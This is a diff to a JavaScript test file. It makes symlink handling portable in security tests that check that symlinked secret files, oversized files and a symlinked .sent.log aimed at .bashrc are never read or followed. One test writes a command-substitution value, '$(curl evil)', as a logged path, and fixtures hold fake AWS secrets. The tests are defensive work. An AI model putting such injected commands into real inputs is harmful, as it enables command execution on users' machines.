@@ -14,7 +14,7 @@ import { appendSentLog } from "../lib/intentdir.js";
 import { sanitize } from "../lib/render.js";
 import { clip, wellFormed } from "../lib/text.js";
 import { createFakeProver, TEST_KEY } from "./helpers/fake-prover.js";
-import { QUIET_GLOBAL, fixture, tmpdir, makeRepo, baseEnv, runHook, saveKey, BIN } from "./helpers/env.js";
+import { symlink, CAN_SYMLINK_FILES, SKIP_FILE_SYMLINKS, QUIET_GLOBAL, fixture, tmpdir, makeRepo, baseEnv, runHook, saveKey, BIN } from "./helpers/env.js";
 
 let fp;
 before(async () => { fp = createFakeProver({ pollsBeforeDone: 0 }); await fp.listen(); });
@@ -60,7 +60,7 @@ test("2. prior artifacts: symlinks and oversized files are not read, contents ar
   fs.writeFileSync(secretFile, `aws_secret_access_key = ${SECRET}\n`);
   const dir = path.join(root, ".intent", "app.py");
   fs.mkdirSync(dir, { recursive: true });
-  fs.symlinkSync(secretFile, path.join(dir, "INTENT.md"));
+  if (CAN_SYMLINK_FILES) symlink(secretFile, path.join(dir, "INTENT.md"));
   fs.writeFileSync(path.join(dir, "SPEC.k"), "x".repeat(70 * 1024));
   fs.writeFileSync(path.join(dir, "SEMANTICS.k"), `token = "${SECRET}"\n`);
   const p = readPrior(root, "app.py");
@@ -69,7 +69,7 @@ test("2. prior artifacts: symlinks and oversized files are not read, contents ar
   assert.ok(!p.semantics_k.includes(SECRET));
   // A symlinked .intent folder is ignored altogether.
   const root2 = tmpdir();
-  fs.symlinkSync(path.join(root, ".intent"), path.join(root2, ".intent"));
+  symlink(path.join(root, ".intent"), path.join(root2, ".intent"));
   assert.equal(readPrior(root2, "app.py"), null);
 });
 
@@ -135,12 +135,12 @@ test("4. clipping never splits a surrogate pair; NUL and lone surrogates are cle
   assert.ok(!json.includes("\\u0000"));
 });
 
-test("5. a symlinked .sent.log is never followed", () => {
+test("5. a symlinked .sent.log is never followed", { skip: SKIP_FILE_SYMLINKS }, () => {
   const root = tmpdir();
   const target = path.join(tmpdir("intent-home-"), ".bashrc");
   fs.writeFileSync(target, "# rc\n");
   fs.mkdirSync(path.join(root, ".intent"));
-  fs.symlinkSync(target, path.join(root, ".intent", ".sent.log"));
+  symlink(target, path.join(root, ".intent", ".sent.log"));
   appendSentLog(root, { time: "t", paths: ["$(curl evil)"] });
   assert.equal(fs.readFileSync(target, "utf8"), "# rc\n");
 });
